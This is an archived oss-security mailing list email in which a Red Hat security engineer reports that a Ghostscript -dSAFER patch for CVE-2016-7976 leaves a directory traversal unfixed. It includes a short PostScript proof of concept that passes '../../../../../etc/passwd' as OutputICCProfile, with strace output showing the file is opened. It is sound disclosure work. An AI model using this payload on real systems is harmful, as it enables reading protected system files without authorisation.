X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1452" "Wednesday" "19" "October" "2016" "16:29:43" "+0200" "Cedric Buissart" "cbuissar@redhat.com" "<CAKG8Do7EXM-eTWVARz9Mys-jH=WqJs==hJLb5V-_Znw_Cm1fNg@mail.gmail.com>" "44" "Re: [oss-security] Re: CVE Request - multiple ghostscript -dSAFER sandbox problems" nil nil nil "10" "2016101914:29:43" "[oss-security] Re: CVE Request - multiple ghostscript -dSAFER sandbox problems" (number mark "U       cbuissar@red Oct 19   44/1452  " thread-indent "\"Re: [oss-security] Re: CVE Request - multiple ghostscript -dSAFER sandbox problems\"\n") "<20161005180433.E7BC8B2E063@smtpvbsrv1.mitre.org>" ("<CAJ_zFk+f8Q-4UQt0gv6X_v_gSb12UVVVQ1knJBdZjpA=MQ-S5w@mail.gmail.com>" "<20161005180433.E7BC8B2E063@smtpvbsrv1.mitre.org>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 10230 invoked by uid 550); 19 Oct 2016 14:30:17 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 10206 invoked from network); 19 Oct 2016 14:30:16 -0000
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:in-reply-to:references:from:date
         :message-id:subject:to:cc;
        bh=QnJYcC5DZjMpBtL8wiGlB67biANlDzIigXRycbS9JR0=;
        b=bWfEuWWEZwm8OoruGE5AaCLAZxhwDQynlsuNLjhrIlbD3+Smld9TRfyxt6geWLAsmr
         pSUcCB5D2m3QCN0bXiXwoTh2QhxR/ukZv55n+PzPuK/IY84pyChsTxQIn7crrvR59lkW
         OOW4upvbtcsPU79QYRubRNt+kaAxycj0kV/pwaci0kK/ECX28JrKqQoM7zOlco5WYCeE
         KhRgffRS+7j140Eg+sdV3Xt+570ur5rinRK4es5sgSifczhYtXam2KOWcP2cu9hy5PP3
         sWZ6I6gTGqshka6VRORfTpEdAognu2H4p36O9yFd4eIAIkFD0nq1cKHpLhwXklCR1uEb
         wSyQ==
X-Gm-Message-State: AA6/9Rl/zHyJbFZHCH8el94tLzNsPNbQRXI2J0X1IyLVQP/R5Gw4qSH7vDShKDnfwSFsUs3keL250VNdF2s8ja9I
X-Received: by 10.36.245.9 with SMTP id k9mr6563232ith.81.1476887404417; Wed,
 19 Oct 2016 07:30:04 -0700 (PDT)
MIME-Version: 1.0
In-Reply-To: <20161005180433.E7BC8B2E063@smtpvbsrv1.mitre.org>
References: <CAJ_zFk+f8Q-4UQt0gv6X_v_gSb12UVVVQ1knJBdZjpA=MQ-S5w@mail.gmail.com>
 <20161005180433.E7BC8B2E063@smtpvbsrv1.mitre.org>
From: Cedric Buissart <cbuissar@redhat.com>
Date: Wed, 19 Oct 2016 16:29:43 +0200
Message-ID: <CAKG8Do7EXM-eTWVARz9Mys-jH=WqJs==hJLb5V-_Znw_Cm1fNg@mail.gmail.com>
To: oss-security@lists.openwall.com
Cc: taviso@google.com
Content-Type: multipart/alternative; boundary=94eb2c03596e1d2b0b053f38a56a
Subject: Re: [oss-security] Re: CVE Request - multiple ghostscript -dSAFER
 sandbox problems

--94eb2c03596e1d2b0b053f38a56a
Content-Type: text/plain; charset=UTF-8

On Wed, Oct 5, 2016 at 8:04 PM, <cve-assign@mitre.org> wrote:

>
>
> > bug: various userparams allow %pipe% in paths, allowing remote shell
> > command execution.
> > id: http://bugs.ghostscript.com/show_bug.cgi?id=697178
> > repro: http://www.openwall.com/lists/oss-security/2016/09/30/8
> > patch: http://git.ghostscript.com/?p=user/chrisl/ghostpdl.git;h=
> 71ac87493b1e445d6c07554d4246cf7d4f44875c
>
> Use CVE-2016-7976.
>
> There currently isn't a separate CVE ID for the earlier impact that
> occurred when "b" was in the mode argument to popen. The question of
> whether popen will execute anyway (even with the 'b" character) is,
> more or less, a reachability concern in this context, and doesn't mean
> that a second vulnerability needs to be defined.
>
> The original report for this bug (http://bugs.ghostscript.com/
show_bug.cgi?id=697178), as described by Florian, was mentioning a
directory traversal issue.
The directory traversal does not appear to be resolved after applying the
given patch :

$ cat putdevice-open.ps
%!PS
currentdevice null true mark /OutputICCProfile (../../../../../etc/passwd)
.putdeviceparams
quit
$ strace -f -e open gs -dSAFER putdevice-open.ps |& grep passwd
open("/usr/share/ghostscript/9.20/iccprofiles/../../../../../etc/passwd",
O_RDONLY) = 6

Is it expected ?

-- 
Cedric Buissart,
Product Security

--94eb2c03596e1d2b0b053f38a56a--
